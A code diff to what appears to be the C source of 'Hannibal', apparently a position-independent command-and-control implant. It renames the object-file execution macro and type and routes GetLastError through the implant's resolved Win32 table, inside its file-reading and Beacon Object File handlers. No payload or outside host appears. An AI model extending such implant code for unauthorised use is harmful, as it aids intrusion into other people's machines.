@@ -2,7 +2,7 @@
 #include "BeaconApi.h"
 #include "config.h"
 
-#ifdef INCLUDE_CMD_BOF
+#ifdef INCLUDE_CMD_EXECUTE_BOF
 
 #include "hannibal_tasking.h"
 
@@ -41,28 +41,28 @@ BOOL ReadFileFromDiskA(PINSTANCE hannibal_instance_ptr, char *task_uuid, LPCSTR 
 
 	if ((hFile = hannibal_instance_ptr->Win32.CreateFileA(cFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
 		// printf("[!] CreateFileA Failed With Error: %ld \n", GetLastError());
-			pic_sprintf(DbgString, "[!] CreateFileA Failed With Error: %ld \n", GetLastError());
+			pic_sprintf(DbgString, "[!] CreateFileA Failed With Error: %ld \n", hannibal_instance_ptr->Win32.GetLastError());
 			hannibal_response(DbgString, task_uuid);
 		goto _END_OF_FUNC;
 	}
 
 	if ((dwFileSize = hannibal_instance_ptr->Win32.GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
 		// printf("[!] GetFileSize Failed With Error: %ld \n", GetLastError());
-			pic_sprintf(DbgString, "[!] GetFileSize Failed With Error: %ld \n", GetLastError());
+			pic_sprintf(DbgString, "[!] GetFileSize Failed With Error: %ld \n", hannibal_instance_ptr->Win32.GetLastError());
 			hannibal_response(DbgString, task_uuid);
 		goto _END_OF_FUNC;
 	}
 
 	if (!(pBaseAddress = hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize))) {
 		// printf("[!] HeapAlloc Failed With Error: %ld \n", GetLastError());
-			pic_sprintf(DbgString, "[!] HeapAlloc Failed With Error: %ld \n", GetLastError());
+			pic_sprintf(DbgString, "[!] HeapAlloc Failed With Error: %ld \n", hannibal_instance_ptr->Win32.GetLastError());
 			hannibal_response(DbgString, task_uuid);
 		goto _END_OF_FUNC;
 	}
 
 	if (!hannibal_instance_ptr->Win32.ReadFile(hFile, pBaseAddress, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
 		// printf("[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesRead, dwFileSize);
-			pic_sprintf(DbgString, "[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesRead, dwFileSize);
+			pic_sprintf(DbgString, "[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", hannibal_instance_ptr->Win32.GetLastError(), dwNumberOfBytesRead, dwFileSize);
 			hannibal_response(DbgString, task_uuid);
 		goto _END_OF_FUNC;
 	}
@@ -634,7 +634,7 @@ SECTION_CODE void cmd_bof(TASK t)
 {
 	HANNIBAL_INSTANCE_PTR
 
-	CMD_BOF *bof = (CMD_BOF *)t.cmd;
+	CMD_EXECUTE_BOF *bof = (CMD_EXECUTE_BOF *)t.cmd;
 
 	do_bof(hannibal_instance_ptr, bof->path_bof, t.task_uuid);
 }
